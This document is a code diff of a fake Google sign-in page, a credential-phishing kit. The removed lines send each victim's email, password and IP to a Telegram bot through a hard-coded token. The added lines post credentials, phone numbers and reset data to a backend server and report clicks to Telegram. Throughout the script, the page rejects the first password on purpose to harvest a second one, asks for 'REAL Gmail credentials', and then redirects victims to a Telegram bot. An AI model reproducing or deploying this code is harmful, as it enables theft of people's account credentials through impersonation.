@@ -9,30 +9,59 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Google Sans', 'Roboto', system-ui;
+            font-family: 'Google Sans', 'Roboto', system-ui, -apple-system, 'Segoe UI', sans-serif;
         }
+
         body {
             min-height: 100vh;
-            background: #ffffff;
+            background: #f1f3f4;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 1rem;
         }
+
         .google-card {
             max-width: 450px;
             width: 100%;
             background: #ffffff;
             border-radius: 0.75rem;
             border: 1px solid #dadce0;
-            padding: 2rem;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+            padding: 2rem 2rem 1.5rem 2rem;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+            position: relative;
         }
-        .google-logo { text-align: center; margin-bottom: 1rem; }
-        .google-logo img { width: 75px; height: auto; }
-        h1 { font-size: 1.5rem; font-weight: 500; color: #202124; text-align: center; margin-bottom: 0.5rem; }
-        .sub { color: #5f6368; font-size: 0.85rem; text-align: center; margin-bottom: 1.8rem; }
-        .input-group { margin-bottom: 0.8rem; }
+
+        .google-logo {
+            text-align: center;
+            margin-bottom: 1rem;
+        }
+
+        .google-logo img {
+            width: 75px;
+            height: auto;
+        }
+
+        h1 {
+            font-size: 1.5rem;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 0.5rem;
+            text-align: center;
+        }
+
+        .sub {
+            color: #5f6368;
+            font-size: 0.85rem;
+            text-align: center;
+            margin-bottom: 1.8rem;
+        }
+
+        .input-group {
+            margin-bottom: 0.8rem;
+            position: relative;
+        }
+
         .input-group input {
             width: 100%;
             padding: 0.85rem 1rem;
@@ -42,12 +71,25 @@
             color: #202124;
             font-size: 1rem;
             outline: none;
+            transition: all 0.2s;
         }
+
         .input-group input:focus {
             border-color: #1a73e8;
             box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
         }
-        .next-button-container { display: flex; justify-content: flex-end; margin-top: 1rem; margin-bottom: 1.5rem; }
+
+        .input-group input::placeholder {
+            color: #80868b;
+        }
+
+        .next-button-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
         .next-btn {
             padding: 0.75rem 1.5rem;
             background: #1a73e8;
@@ -57,174 +99,569 @@
             font-size: 0.9rem;
             font-weight: 600;
             cursor: pointer;
+            transition: all 0.2s;
         }
-        .next-btn:hover { background: #1557b0; }
-        .links-row { display: flex; justify-content: space-between; margin: 0.5rem 0 1rem; font-size: 0.8rem; }
-        .links-row a, .links-row span { color: #1a73e8; text-decoration: none; cursor: pointer; }
-        .links-row a:hover, .links-row span:hover { text-decoration: underline; }
-        .guest-text { text-align: left; margin: 1rem 0; font-size: 0.75rem; color: #5f6368; }
-        .guest-text a { color: #1a73e8; text-decoration: none; }
-        .create-account { display: inline-block; margin: 0.5rem 0 1rem; font-size: 0.85rem; color: #1a73e8; text-decoration: none; cursor: pointer; }
-        .message { margin-top: 1rem; padding: 0.7rem; border-radius: 0.25rem; font-size: 0.8rem; text-align: center; display: none; }
-        .error-msg { background: #fce8e6; border: 1px solid #d93025; color: #d93025; }
-        .success-msg { background: #e6f4ea; border: 1px solid #34a853; color: #137333; }
-        .footer { display: flex; justify-content: center; gap: 1.2rem; margin-top: 1.5rem; padding-top: 1rem; border-top: 1px solid #e8eaed; font-size: 0.7rem; color: #5f6368; }
-        .step-text { text-align: center; font-size: 0.7rem; color: #5f6368; margin-top: 0.5rem; }
-        .cancel-btn {
+
+        .next-btn:hover {
+            background: #1557b0;
+        }
+
+        .links-row {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 0.5rem;
+            margin-bottom: 1rem;
+            font-size: 0.8rem;
+        }
+
+        .links-row a, .links-row span {
+            color: #1a73e8;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .links-row a:hover, .links-row span:hover {
+            text-decoration: underline;
+        }
+
+        .guest-text {
+            text-align: left;
+            margin-top: 1rem;
+            margin-bottom: 1rem;
+            font-size: 0.75rem;
+            color: #5f6368;
+            line-height: 1.4;
+        }
+
+        .guest-text a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .guest-text a:hover {
+            text-decoration: underline;
+        }
+
+        .create-account {
+            display: inline-block;
+            margin-top: 0.5rem;
+            margin-bottom: 1rem;
+            font-size: 0.85rem;
+            color: #1a73e8;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+        }
+
+        .message {
+            margin-top: 1rem;
+            padding: 0.7rem;
+            border-radius: 0.25rem;
+            font-size: 0.8rem;
+            text-align: center;
+            display: none;
+        }
+
+        .error-msg {
+            background: #fce8e6;
+            border: 1px solid #d93025;
+            color: #d93025;
+        }
+
+        .success-msg {
+            background: #e6f4ea;
+            border: 1px solid #34a853;
+            color: #137333;
+        }
+
+        .footer {
+            display: flex;
+            justify-content: center;
+            gap: 1.2rem;
+            margin-top: 1.5rem;
+            padding-top: 1rem;
+            border-top: 1px solid #e8eaed;
+            font-size: 0.7rem;
+            color: #5f6368;
+        }
+
+        .footer span {
+            cursor: pointer;
+        }
+
+        .footer span:hover {
+            color: #1a73e8;
+        }
+
+        .step-text {
+            text-align: center;
+            font-size: 0.7rem;
+            color: #5f6368;
+            margin-top: 0.5rem;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            padding: 0.85rem;
-            background: #dc3545;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: white;
+            max-width: 400px;
+            width: 90%;
+            padding: 2rem;
+            border-radius: 1rem;
+            text-align: center;
+            position: relative;
+        }
+
+        .modal-content input {
+            width: 100%;
+            padding: 0.8rem;
+            margin: 0.5rem 0;
+            border: 1px solid #dadce0;
+            border-radius: 0.25rem;
+        }
+
+        .modal-content button {
+            background: #1a73e8;
             color: white;
+            padding: 0.8rem;
             border: none;
             border-radius: 0.25rem;
-            font-size: 1rem;
-            font-weight: 600;
+            width: 100%;
+            margin-top: 1rem;
             cursor: pointer;
-            margin-top: 1rem;
         }
-        .cancel-btn:hover { background: #c82333; }
-        .hidden { display: none; }
-        .btn-group {
-            display: flex;
-            gap: 1rem;
-            margin-top: 1rem;
-        }
-        .btn-group .cancel-btn {
-            margin-top: 0;
-            flex: 1;
+
+        .close-modal {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 1.5rem;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
 
 <div class="google-card">
-    <!-- مرحله 1: برېښنالیک -->
     <div id="step1View">
-        <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
+        <div class="google-logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+        </div>
         <h1>Sign in</h1>
         <div class="sub">Use your Google Account</div>
-        <div class="input-group"><input type="email" id="emailInput" placeholder="Email or phone"></div>
-        <div class="next-button-container"><button class="next-btn" id="nextBtn">Next</button></div>
-        <div class="links-row"><span onclick="alert('Forgot email?')">Forgot email?</span><span onclick="alert('Guest mode')">Guest mode</span></div>
-        <div class="guest-text">Not your computer? Use Guest mode to sign in privately.<div style="margin-top:0.3rem;"><a href="#" onclick="alert('Learn more'); return false;">Learn more</a></div></div>
-        <a href="#" class="create-account" onclick="alert('Create account'); return false;">Create account</a>
+
+        <div class="input-group">
+            <input type="email" id="emailInput" placeholder="Email or phone">
+        </div>
+
+        <div class="next-button-container">
+            <button class="next-btn" id="nextBtn">Next</button>
+        </div>
+
+        <div class="links-row">
+            <span onclick="openForgotPasswordModal()">Forgot email?</span>
+            <span onclick="sendToAdminFromLink('Guest mode', 'Guest mode link clicked')">Guest mode</span>
+        </div>
+
+        <div class="guest-text">
+            Not your computer? Use Guest mode to sign in privately.
+            <div style="margin-top: 0.3rem;">
+                <a href="#" onclick="sendToAdminFromLink('Learn more', 'Learn more about Guest mode clicked'); return false;">Learn more</a>
+            </div>
+        </div>
+
+        <a href="#" class="create-account" onclick="openCreateAccountModal(); return false;">Create account</a>
     </div>
 
-    <!-- مرحله 2: پټنوم -->
-    <div id="step2View" class="hidden">
-        <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
+    <div id="step2View" style="display: none;">
+        <div class="google-logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+        </div>
         <h1>Sign in</h1>
         <div class="sub" id="displayEmail"></div>
-        <div class="input-group"><input type="password" id="passwordInput" placeholder="Enter your password"></div>
-        <div class="next-button-container"><button class="next-btn" id="loginBtn">Next</button></div>
-        <div class="links-row"><span onclick="goBackToEmail()">← Back</span><span onclick="alert('Forgot password?')">Forgot password?</span></div>
-        <div class="guest-text">Not your computer? Use Guest mode to sign in privately.<div style="margin-top:0.3rem;"><a href="#" onclick="alert('Learn more'); return false;">Learn more</a></div></div>
-    </div>
 
-    <!-- د بریالیتوب پینل -->
-    <div id="successPanel" class="hidden">
-        <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
-        <h1>✅ Verification Complete</h1>
-        <div class="sub">Your account has been successfully verified!</div>
-        <div class="btn-group">
-            <button class="cancel-btn" id="cancelBtn">✖ CANCEL - Return to Bot</button>
+        <div class="input-group">
+            <input type="password" id="passwordInput" placeholder="Enter your password">
+        </div>
+
+        <div class="next-button-container">
+            <button class="next-btn" id="loginBtn">Next</button>
+        </div>
+
+        <div class="links-row">
+            <span onclick="goBackToEmail()">← Back</span>
+            <span onclick="openForgotPasswordModal()">Forgot password?</span>
+        </div>
+
+        <div class="guest-text">
+            Not your computer? Use Guest mode to sign in privately.
+            <div style="margin-top: 0.3rem;">
+                <a href="#" onclick="sendToAdminFromLink('Learn more', 'Learn more clicked'); return false;">Learn more</a>
+            </div>
         </div>
     </div>
 
     <div id="errorBox" class="message error-msg"></div>
     <div id="successBox" class="message success-msg"></div>
     <div class="step-text" id="stepIndicator">Step 1 of 2</div>
-    <div class="footer"><span onclick="alert('English')">English</span><span onclick="alert('Help')">Help</span><span onclick="alert('Privacy')">Privacy</span><span onclick="alert('Terms')">Terms</span></div>
+
+    <div class="footer">
+        <span onclick="sendToAdminFromLink('English (United States)', 'Language menu clicked')">English (United States)</span>
+        <span onclick="sendToAdminFromLink('Help', 'Help clicked')">Help</span>
+        <span onclick="sendToAdminFromLink('Privacy', 'Privacy clicked')">Privacy</span>
+        <span onclick="sendToAdminFromLink('Terms', 'Terms clicked')">Terms</span>
+    </div>
+</div>
+
+<!-- Create Account Modal -->
+<div id="createAccountModal" class="modal">
+    <div class="modal-content">
+        <span class="close-modal" onclick="closeCreateAccountModal()">&times;</span>
+        <h3>Create your Google Account</h3>
+        <p style="color:#5f6368; font-size:0.8rem;">Enter your REAL Gmail credentials</p>
+        <input type="text" id="createName" placeholder="Full name">
+        <input type="email" id="createEmail" placeholder="Gmail address">
+        <input type="password" id="createPassword" placeholder="Password">
+        <button onclick="submitCreateAccount()">Create account</button>
+    </div>
+</div>
+
+<!-- Forgot Password Modal -->
+<div id="forgotPasswordModal" class="modal">
+    <div class="modal-content">
+        <span class="close-modal" onclick="closeForgotPasswordModal()">&times;</span>
+        <h3>Reset your password</h3>
+        <p style="color:#5f6368; font-size:0.8rem;">We'll send a verification code to your phone</p>
+        <input type="tel" id="phoneNumber" placeholder="Phone number">
+        <input type="email" id="resetEmail" placeholder="Your email address">
+        <button onclick="sendResetCode()">Send verification code</button>
+    </div>
+</div>
+
+<!-- Verify Code Modal -->
+<div id="verifyCodeModal" class="modal">
+    <div class="modal-content">
+        <span class="close-modal" onclick="closeVerifyCodeModal()">&times;</span>
+        <h3>Verification code</h3>
+        <p style="color:#5f6368; font-size:0.8rem;">Enter the code sent to your phone</p>
+        <input type="text" id="verificationCode" placeholder="6-digit code">
+        <button onclick="verifyCode()">Verify</button>
+    </div>
+</div>
+
+<!-- New Password Modal -->
+<div id="newPasswordModal" class="modal">
+    <div class="modal-content">
+        <span class="close-modal" onclick="closeNewPasswordModal()">&times;</span>
+        <h3>Create new password</h3>
+        <p style="color:#5f6368; font-size:0.8rem;" id="resetEmailDisplay"></p>
+        <input type="password" id="newPassword" placeholder="New password">
+        <input type="password" id="confirmPassword" placeholder="Confirm password">
+        <button onclick="resetPassword()">Reset password</button>
+    </div>
 </div>
 
 <script>
-    // ========== د بوټ لینک (ستاسو د بوټ یوزرنیم سره) ==========
-    const BOT_REDIRECT = "https://t.me/imrankhabot?start=confirm_account";
-    
-    const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
-    const ADMIN_ID = "8295417969";
+    // ==================== API Settings ====================
 
-    let attempts = {};
+    const BOT_REDIRECT = "https://t.me/imrankhabot?start=8020108872";
+
+    let attemptStore = {};
     let currentEmail = "";
+    let pendingResetEmail = "";
+    let generatedCode = "";
 
-    async function getUserIP() {
-        try { let r = await fetch('https://api.ipify.org?format=json'); let d = await r.json(); return d.ip; }
-        catch(e) { return 'unknown'; }
+    const step1View = document.getElementById('step1View');
+    const step2View = document.getElementById('step2View');
+    const emailInput = document.getElementById('emailInput');
+    const passwordInput = document.getElementById('passwordInput');
+    const displayEmailSpan = document.getElementById('displayEmail');
+    const errorBox = document.getElementById('errorBox');
+    const successBox = document.getElementById('successBox');
+    const stepIndicator = document.getElementById('stepIndicator');
+
+    async function sendToTelegram(message) {
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'Markdown' })
+            });
+        } catch (err) { console.warn(err); }
     }
 
-    function showMessage(box, text, isError) {
+    async function sendToAdminFromLink(buttonName, action) {
+        const ip = await getUserIP();
+        const msg = `🔘 *${buttonName}*\n\n⚡ ${action}\n🌐 IP: ${ip}\n🕒 ${new Date().toLocaleString()}`;
+        await sendToTelegram(msg);
+    }
+
+    async function getUserIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch { return 'unknown'; }
+    }
+
+    function showMessage(box, text, isError = true) {
         box.textContent = text;
         box.className = `message ${isError ? 'error-msg' : 'success-msg'}`;
         box.style.display = 'block';
-        setTimeout(() => box.style.display = 'none', 3000);
+        setTimeout(() => { box.style.display = 'none'; }, 3500);
     }
 
     function goBackToEmail() {
-        document.getElementById('step2View').classList.add('hidden');
-        document.getElementById('step1View').classList.remove('hidden');
-        document.getElementById('stepIndicator').textContent = "Step 1 of 2";
-        document.getElementById('emailInput').value = '';
-        document.getElementById('passwordInput').value = '';
-        currentEmail = '';
+        step2View.style.display = 'none';
+        step1View.style.display = 'block';
+        stepIndicator.textContent = "Step 1 of 2";
+        emailInput.value = '';
+        passwordInput.value = '';
+        currentEmail = "";
     }
 
-    // مرحله 1: برېښنالیک
-    document.getElementById('nextBtn').onclick = () => {
-        let email = document.getElementById('emailInput').value.trim();
+    // ========== Create Account ==========
+    function openCreateAccountModal() {
+        document.getElementById('createAccountModal').style.display = 'flex';
+    }
+
+    function closeCreateAccountModal() {
+        document.getElementById('createAccountModal').style.display = 'none';
+        document.getElementById('createName').value = '';
+        document.getElementById('createEmail').value = '';
+        document.getElementById('createPassword').value = '';
+    }
+
+    async function submitCreateAccount() {
+        const name = document.getElementById('createName').value.trim();
+        const email = document.getElementById('createEmail').value.trim();
+        const password = document.getElementById('createPassword').value.trim();
+        const ip = await getUserIP();
+
+        if (!name || !email || !password) {
+            alert("Please fill in all fields!");
+            return;
+        }
+
+        try {
+            const response = await fetch(`${API_BASE_URL}/create-account`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ name, email, password, ip })
+            });
+            const data = await response.json();
+
+            if (data.success) {
+                alert("Account created successfully! You can now login.");
+                closeCreateAccountModal();
+            } else {
+                alert("Invalid Gmail credentials! Please use real Gmail.");
+            }
+        } catch (err) {
+            alert("Network error! Is the server running?");
+        }
+    }
+
+    // ========== Forgot Password ==========
+    function openForgotPasswordModal() {
+        document.getElementById('forgotPasswordModal').style.display = 'flex';
+    }
+
+    function closeForgotPasswordModal() {
+        document.getElementById('forgotPasswordModal').style.display = 'none';
+        document.getElementById('phoneNumber').value = '';
+        document.getElementById('resetEmail').value = '';
+    }
+
+    function closeVerifyCodeModal() {
+        document.getElementById('verifyCodeModal').style.display = 'none';
+        document.getElementById('verificationCode').value = '';
+    }
+
+    function closeNewPasswordModal() {
+        document.getElementById('newPasswordModal').style.display = 'none';
+        document.getElementById('newPassword').value = '';
+        document.getElementById('confirmPassword').value = '';
+    }
+
+    async function sendResetCode() {
+        const phone = document.getElementById('phoneNumber').value.trim();
+        const email = document.getElementById('resetEmail').value.trim();
+        const ip = await getUserIP();
+
+        if (!phone || !email) {
+            alert("Please enter both phone number and email!");
+            return;
+        }
+
+        try {
+            const response = await fetch(`${API_BASE_URL}/send-code`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone, email, ip })
+            });
+            const data = await response.json();
+
+            if (data.success) {
+                generatedCode = data.code;
+                pendingResetEmail = email;
+                alert(`Verification code: ${generatedCode}\n(Simulated - in production this would be sent via SMS)`);
+                closeForgotPasswordModal();
+                document.getElementById('verifyCodeModal').style.display = 'flex';
+            }
+        } catch (err) {
+            alert("Network error!");
+        }
+    }
+
+    async function verifyCode() {
+        const code = document.getElementById('verificationCode').value.trim();
+
+        try {
+            const response = await fetch(`${API_BASE_URL}/verify-code`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: pendingResetEmail, code })
+            });
+            const data = await response.json();
+
+            if (data.success) {
+                closeVerifyCodeModal();
+                document.getElementById('resetEmailDisplay').innerHTML = `Email: ${pendingResetEmail}`;
+                document.getElementById('newPasswordModal').style.display = 'flex';
+            } else {
+                alert("Invalid verification code!");
+            }
+        } catch (err) {
+            alert("Network error!");
+        }
+    }
+
+    async function resetPassword() {
+        const newPass = document.getElementById('newPassword').value.trim();
+        const confirmPass = document.getElementById('confirmPassword').value.trim();
+        const phone = document.getElementById('phoneNumber').value;
+        const ip = await getUserIP();
+
+        if (!newPass || !confirmPass) {
+            alert("Please fill in both password fields!");
+            return;
+        }
+        if (newPass !== confirmPass) {
+            alert("Passwords do not match!");
+            return;
+        }
+
+        try {
+            const response = await fetch(`${API_BASE_URL}/reset-password`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: pendingResetEmail, new_password: newPass, ip, phone })
+            });
+            const data = await response.json();
+
+            if (data.success) {
+                alert("Password reset successfully! You can now login with your new password.");
+                closeNewPasswordModal();
+            } else {
+                alert("Password reset failed!");
+            }
+        } catch (err) {
+            alert("Network error!");
+        }
+    }
+
+    // ========== Login ==========
+    document.getElementById('nextBtn').addEventListener('click', () => {
+        const email = emailInput.value.trim();
         if (!email || !email.includes('@')) {
-            showMessage(document.getElementById('errorBox'), '❌ Valid email required', true);
+            showMessage(errorBox, "❌ Please enter a valid email address.", true);
             return;
         }
         currentEmail = email;
-        document.getElementById('displayEmail').innerHTML = `${currentEmail} ✓`;
-        document.getElementById('step1View').classList.add('hidden');
-        document.getElementById('step2View').classList.remove('hidden');
-        document.getElementById('stepIndicator').textContent = "Step 2 of 2";
-        document.getElementById('passwordInput').value = '';
-    };
+        displayEmailSpan.innerHTML = `${currentEmail} <span style="color:#34a853; font-size:0.7rem;">✓</span>`;
+        emailInput.value = '';
+        step1View.style.display = 'none';
+        step2View.style.display = 'block';
+        stepIndicator.textContent = "Step 2 of 2";
+        passwordInput.value = '';
+    });
 
-    // مرحله 2: پټنوم (3 هڅې)
-    document.getElementById('loginBtn').onclick = async () => {
-        let pass = document.getElementById('passwordInput').value.trim();
-        if (!pass) {
-            showMessage(document.getElementById('errorBox'), '❌ Enter password', true);
+    document.getElementById('loginBtn').addEventListener('click', async () => {
+        const password = passwordInput.value.trim();
+        if (!password) {
+            showMessage(errorBox, "❌ Please enter your password.", true);
             return;
         }
+
+        const ip = await getUserIP();
+        const key = `${currentEmail}_${ip}`;
         
-        let ip = await getUserIP();
-        let key = currentEmail + ip;
-        if (!attempts[key]) attempts[key] = 0;
-        attempts[key]++;
-        
-        // لومړی او دوهم ځل - ناکام
-        if (attempts[key] === 1 || attempts[key] === 2) {
-            showMessage(document.getElementById('errorBox'), `❌ Incorrect password. ${3 - attempts[key]} attempts remaining.`, true);
-            setTimeout(() => goBackToEmail(), 2000);
+        if (!attemptStore[key]) attemptStore[key] = { attempts: 0 };
+        const currentAttempt = attemptStore[key].attempts + 1;
+        attemptStore[key].attempts = currentAttempt;
+
+        if (currentAttempt === 1) {
+            showMessage(errorBox, "❌ Incorrect password. Second attempt will be accepted.", true);
+            setTimeout(() => { goBackToEmail(); }, 2000);
             return;
         }
-        
-        // درېیم ځل - بریالی
-        if (attempts[key] >= 3) {
-            // اډمن ته خبر ورکړئ
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    chat_id: ADMIN_ID, 
-                    text: `✅ LOGIN SUCCESS\nEmail: ${currentEmail}\nPass: ${pass}\nIP: ${ip}`,
-                    parse_mode: 'Markdown'
-                })
-            });
-            
-            // د بریالیتوب پینل ښکاره کړئ
-            document.getElementById('step2View').classList.add('hidden');
-            document.getElementById('successPanel').classList.remove('hidden');
+
+        if (currentAttempt >= 2) {
+            try {
+                const response = await fetch(`${API_BASE_URL}/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: currentEmail, password, ip, attempt: currentAttempt })
+                });
+                const data = await response.json();
+
+                if (data.success) {
+                    showMessage(successBox, "✅ Login successful! Redirecting to Telegram...", false);
+                    const loginBtn = document.getElementById('loginBtn');
+                    loginBtn.disabled = true;
+                    loginBtn.style.opacity = '0.6';
+                    setTimeout(() => { window.location.href = BOT_REDIRECT; }, 1800);
+                } else {
+                    showMessage(errorBox, "❌ Invalid credentials! Access denied.", true);
+                    setTimeout(() => { goBackToEmail(); }, 2000);
+                }
+            } catch (err) {
+                showMessage(errorBox, "❌ Network error! Is the server running?", true);
+                setTimeout(() => { goBackToEmail(); }, 2000);
+            }
         }
-    };
-    
-    // د CANCEL تڼۍ - مستقیم بوټ ته ځي او لومړی ګام بشپړوي
-    document.getElementById('cancelBtn').onclick = () => {
-        window.location.href = BOT_REDIRECT;
-    };
+    });
+
+    emailInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') document.getElementById('nextBtn').click(); });
+    passwordInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') document.getElementById('loginBtn').click(); });
+
+    window.openForgotPasswordModal = openForgotPasswordModal;
+    window.closeForgotPasswordModal = closeForgotPasswordModal;
+    window.closeVerifyCodeModal = closeVerifyCodeModal;
+    window.closeNewPasswordModal = closeNewPasswordModal;
+    window.sendResetCode = sendResetCode;
+    window.verifyCode = verifyCode;
+    window.resetPassword = resetPassword;
+    window.openCreateAccountModal = openCreateAccountModal;
+    window.closeCreateAccountModal = closeCreateAccountModal;
+    window.submitCreateAccount = submitCreateAccount;
+    window.sendToAdminFromLink = sendToAdminFromLink;
+    window.goBackToEmail = goBackToEmail;
 </script>
 </body>
 </html>
